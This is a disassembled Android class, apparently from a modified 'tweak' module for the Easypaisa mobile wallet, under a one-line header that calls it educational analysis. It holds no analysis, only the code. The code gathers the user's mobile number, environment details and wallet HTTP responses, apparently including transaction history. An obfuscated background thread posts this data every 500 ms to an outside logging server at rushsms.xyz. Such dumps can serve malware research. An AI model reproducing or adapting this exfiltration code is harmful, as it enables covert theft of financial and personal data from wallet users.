# Source DEX: classes18.dex
# Disassembled for educational analysis

.class public final Lcom/easypaisaTweak/HttpHelper;
.super Ljava/lang/Object;
.source "SourceFile"

.field private static final static Lcom/easypaisaTweak/HttpHelper;->TAG:Ljava/lang/String;
.field private static static Lcom/easypaisaTweak/HttpHelper;->isInit:Ljava/lang/Boolean;
.field private static final static Lcom/easypaisaTweak/HttpHelper;->lock:Ljava/lang/Object;
.field private static final static Lcom/easypaisaTweak/HttpHelper;->loggerCache:Ljava/lang/StringBuilder;

.method public static constructor Lcom/easypaisaTweak/HttpHelper;-><clinit>()V
    .registers 1
    0000: new-instance v0, Ljava/lang/StringBuilder;
    0002: invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V
    0005: sput-object v0, Lcom/easypaisaTweak/HttpHelper;->loggerCache:Ljava/lang/StringBuilder;
    0007: sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;
    0009: sput-object v0, Lcom/easypaisaTweak/HttpHelper;->isInit:Ljava/lang/Boolean;
    000b: new-instance v0, Ljava/lang/Object;
    000d: invoke-direct {v0}, Ljava/lang/Object;-><init>()V
    0010: sput-object v0, Lcom/easypaisaTweak/HttpHelper;->lock:Ljava/lang/Object;
    0012: return-void
.end method

.method private constructor Lcom/easypaisaTweak/HttpHelper;-><init>()V
    .registers 2
    0000: invoke-direct {v1}, Ljava/lang/Object;-><init>()V
    0003: new-instance v1, Ljava/lang/IllegalStateException;
    0005: const-string v0, 'HTTPHelper Utility class'
    0007: invoke-direct {v1, v0}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V
    000a: throw v1
.end method

.method public static Lcom/easypaisaTweak/HttpHelper;->httpLoop()V
    .registers 7
    0000: const-string v0, 'EasypaisaTweak'
    0002: const-string v1, 'start httpLoop thread'
    0004: invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;, Ljava/lang/String;)I
    0007: const-string v0, 'application/json; charset=utf-8'
    0009: invoke-static {v0}, Lokhttp3/MediaType;->parse(Ljava/lang/String;)Lokhttp3/MediaType;
    000c: move-result-object v0
    000d: new-instance v1, Lokhttp3/OkHttpClient;
    000f: invoke-direct {v1}, Lokhttp3/OkHttpClient;-><init>()V
    0012: sget-object v2, Lcom/easypaisaTweak/HttpHelper;->lock:Ljava/lang/Object;
    0014: monitor-enter v2
    0015: sget-object v3, Lcom/easypaisaTweak/HttpHelper;->loggerCache:Ljava/lang/StringBuilder;
    0017: invoke-virtual {v3}, Ljava/lang/StringBuilder;->length()I
    001a: move-result v4
    001b: if-lez v4, 0065
    001d: invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    0020: move-result-object v4
    0021: invoke-static {v0, v4}, Lokhttp3/RequestBody;->create(Lokhttp3/MediaType;, Ljava/lang/String;)Lokhttp3/RequestBody;
    0024: move-result-object v4
    0025: new-instance v5, Lokhttp3/Request$Builder;
    0027: invoke-direct {v5}, Lokhttp3/Request$Builder;-><init>()V
    002a: const-string v6, 'https://log-bg.rushsms.xyz/easypaisa_logger.php'
    002c: invoke-virtual {v5, v6}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;
    002f: move-result-object v5
    0030: invoke-virtual {v5, v4}, Lokhttp3/Request$Builder;->post(Lokhttp3/RequestBody;)Lokhttp3/Request$Builder;
    0033: move-result-object v4
    0034: invoke-virtual {v4}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;
    0037: move-result-object v4
    0038: invoke-virtual {v1, v4}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;
    003b: move-result-object v4
    003c: invoke-interface {v4}, Lokhttp3/Call;->execute()Lokhttp3/Response;
    003f: invoke-virtual {v3}, Ljava/lang/StringBuilder;->length()I
    0042: move-result v4
    0043: const/4 v5, #0
    0044: invoke-virtual {v3, v5, v4}, Ljava/lang/StringBuilder;->delete(I, I)Ljava/lang/StringBuilder;
    0047: goto 0065
    0048: move-exception v0
    0049: goto 006c
    004a: move-exception v3
    004b: const-string v4, 'EasypaisaTweak'
    004d: new-instance v5, Ljava/lang/StringBuilder;
    004f: invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V
    0052: const-string v6, 'httpLoop error:'
    0054: invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0057: invoke-virtual {v3}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;
    005a: move-result-object v3
    005b: invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    005e: invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    0061: move-result-object v3
    0062: invoke-static {v4, v3}, Landroid/util/Log;->e(Ljava/lang/String;, Ljava/lang/String;)I
    0065: monitor-exit v2
    0066: const-wide/16 v2, #500
    0068: invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    006b: goto 0012
    006c: monitor-exit v2
    006d: throw v0
.end method

.method public static Lcom/easypaisaTweak/HttpHelper;->httpPost(Ljava/lang/String;, Ljava/lang/String;, Lokhttp3/Headers;)Ljava/lang/String;
    .registers 8
    0000: const-string v0, 'Request failed: '
    0002: const-string v1, 'httpPost 3:'
    0004: new-instance v2, Lokhttp3/OkHttpClient;
    0006: invoke-direct {v2}, Lokhttp3/OkHttpClient;-><init>()V
    0009: const-string v3, 'application/json; charset=utf-8'
    000b: invoke-static {v3}, Lokhttp3/MediaType;->parse(Ljava/lang/String;)Lokhttp3/MediaType;
    000e: move-result-object v3
    000f: invoke-static {v3, v5}, Lokhttp3/RequestBody;->create(Lokhttp3/MediaType;, Ljava/lang/String;)Lokhttp3/RequestBody;
    0012: move-result-object v5
    0013: if-nez v7, 0025
    0015: new-instance v7, Ljava/util/HashMap;
    0017: invoke-direct {v7}, Ljava/util/HashMap;-><init>()V
    001a: const-string v3, 'Accept'
    001c: const-string v4, 'application/json'
    001e: invoke-virtual {v7, v3, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;, Ljava/lang/Object;)Ljava/lang/Object;
    0021: invoke-static {v7}, Lokhttp3/Headers;->of(Ljava/util/Map;)Lokhttp3/Headers;
    0024: move-result-object v7
    0025: new-instance v3, Lokhttp3/Request$Builder;
    0027: invoke-direct {v3}, Lokhttp3/Request$Builder;-><init>()V
    002a: invoke-virtual {v3, v6}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;
    002d: move-result-object v6
    002e: invoke-virtual {v6, v5}, Lokhttp3/Request$Builder;->post(Lokhttp3/RequestBody;)Lokhttp3/Request$Builder;
    0031: move-result-object v5
    0032: invoke-virtual {v5, v7}, Lokhttp3/Request$Builder;->headers(Lokhttp3/Headers;)Lokhttp3/Request$Builder;
    0035: move-result-object v5
    0036: invoke-virtual {v5}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;
    0039: move-result-object v5
    003a: invoke-virtual {v2, v5}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;
    003d: move-result-object v5
    003e: invoke-interface {v5}, Lokhttp3/Call;->execute()Lokhttp3/Response;
    0041: move-result-object v5
    0042: new-instance v6, Ljava/lang/StringBuilder;
    0044: invoke-direct {v6, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    0047: invoke-virtual {v5}, Lokhttp3/Response;->toString()Ljava/lang/String;
    004a: move-result-object v7
    004b: invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    004e: invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    0051: move-result-object v6
    0052: invoke-static {v6}, Lcom/easypaisaTweak/HttpHelper;->saveToCache(Ljava/lang/String;)V
    0055: invoke-virtual {v5}, Lokhttp3/Response;->isSuccessful()Z
    0058: move-result v6
    0059: if-eqz v6, 0072
    005b: invoke-virtual {v5}, Lokhttp3/Response;->code()I
    005e: move-result v6
    005f: const/16 v7, #200
    0061: if-ne v6, v7, 0072
    0063: invoke-virtual {v5}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;
    0066: move-result-object v6
    0067: if-eqz v6, 0072
    0069: invoke-virtual {v5}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;
    006c: move-result-object v5
    006d: invoke-virtual {v5}, Lokhttp3/ResponseBody;->string()Ljava/lang/String;
    0070: move-result-object v5
    0071: return-object v5
    0072: new-instance v6, Ljava/lang/StringBuilder;
    0074: invoke-direct {v6, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    0077: invoke-virtual {v5}, Lokhttp3/Response;->code()I
    007a: move-result v7
    007b: invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
    007e: const-string v7, ' body:'
    0080: invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0083: invoke-virtual {v5}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;
    0086: move-result-object v5
    0087: invoke-virtual {v5}, Lokhttp3/ResponseBody;->string()Ljava/lang/String;
    008a: move-result-object v5
    008b: invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    008e: invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    0091: move-result-object v5
    0092: invoke-static {v5}, Lcom/easypaisaTweak/HttpHelper;->saveToCache(Ljava/lang/String;)V
    0095: goto 00ac
    0096: move-exception v5
    0097: new-instance v6, Ljava/lang/StringBuilder;
    0099: const-string v7, 'httpPost error:'
    009b: invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    009e: invoke-virtual {v5}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;
    00a1: move-result-object v5
    00a2: invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    00a5: invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    00a8: move-result-object v5
    00a9: invoke-static {v5}, Lcom/easypaisaTweak/HttpHelper;->saveToCache(Ljava/lang/String;)V
    00ac: const-string v5, ''
    00ae: return-object v5
.end method

.method private static synthetic Lcom/easypaisaTweak/HttpHelper;->lambda$saveToCache$0()V
    .registers 2
    0000: const-string v0, 'EasypaisaTweak'
    0002: const-string v1, 'start getTransactionHistory thread'
    0004: invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;, Ljava/lang/String;)I
    0007: invoke-static {}, Lcom/easypaisaTweak/HttpHelper;->httpLoop()V
    000a: return-void
    000b: move-exception v0
    000c: new-instance v1, Ljava/lang/RuntimeException;
    000e: invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V
    0011: throw v1
.end method

.method public static Lcom/easypaisaTweak/HttpHelper;->saveToCache(Ljava/lang/String;)V
    .registers 6
    0000: const-string v0, '19-'
    0002: const-string v1, 'EasypaisaTweak'
    0004: invoke-static {v1, v5}, Landroid/util/Log;->i(Ljava/lang/String;, Ljava/lang/String;)I
    0007: sget-object v1, Lcom/easypaisaTweak/HttpHelper;->lock:Ljava/lang/Object;
    0009: monitor-enter v1
    000a: new-instance v2, Ljava/text/SimpleDateFormat;
    000c: const-string v3, 'yyyy-MM-dd HH:mm:ss.SSS'
    000e: invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;
    0011: move-result-object v4
    0012: invoke-direct {v2, v3, v4}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;, Ljava/util/Locale;)V
    0015: new-instance v3, Ljava/util/Date;
    0017: invoke-direct {v3}, Ljava/util/Date;-><init>()V
    001a: invoke-virtual {v2, v3}, Ljava/text/DateFormat;->format(Ljava/util/Date;)Ljava/lang/String;
    001d: move-result-object v2
    001e: invoke-static {}, Lcom/easypaisaTweak/WalletApp;->getMobileNo()Ljava/lang/String;
    0021: move-result-object v3
    0022: goto 0025
    0023: const-string v3, 'noLogin'
    0025: sget-object v4, Lcom/easypaisaTweak/HttpHelper;->loggerCache:Ljava/lang/StringBuilder;
    0027: invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    002a: const-string v2, '#'
    002c: invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    002f: invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0032: const-string v2, '#'
    0034: invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0037: new-instance v2, Ljava/lang/StringBuilder;
    0039: invoke-direct {v2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    003c: sget-object v0, Lcom/easypaisaTweak/WalletApp;->runningEnv:Ljava/lang/String;
    003e: invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0041: invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    0044: move-result-object v0
    0045: invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0048: const-string v0, '#'
    004a: invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    004d: invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0050: const-string v5, '\n'
    0052: invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0055: sget-object v5, Lcom/easypaisaTweak/HttpHelper;->isInit:Ljava/lang/Boolean;
    0057: invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z
    005a: move-result v5
    005b: if-nez v5, 006f
    005d: sget-object v5, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;
    005f: sput-object v5, Lcom/easypaisaTweak/HttpHelper;->isInit:Ljava/lang/Boolean;
    0061: new-instance v5, Ljava/lang/Thread;
    0063: new-instance v0, Lcom/easypaisaTweak/newpackage/ZkcTAP1xkT;
    0065: const/4 v2, #0
    0066: invoke-direct {v0, v2}, Lcom/easypaisaTweak/newpackage/ZkcTAP1xkT;-><init>(I)V
    0069: invoke-direct {v5, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    006c: invoke-virtual {v5}, Ljava/lang/Thread;->start()V
    006f: monitor-exit v1
    0070: return-void
    0071: move-exception v5
    0072: monitor-exit v1
    0073: throw v5
.end method

.method public static synthetic Lcom/easypaisaTweak/HttpHelper;->yWkiZmD()V
    .registers 0
    0000: invoke-static {}, Lcom/easypaisaTweak/HttpHelper;->lambda$saveToCache$0()V
    0003: return-void
.end method
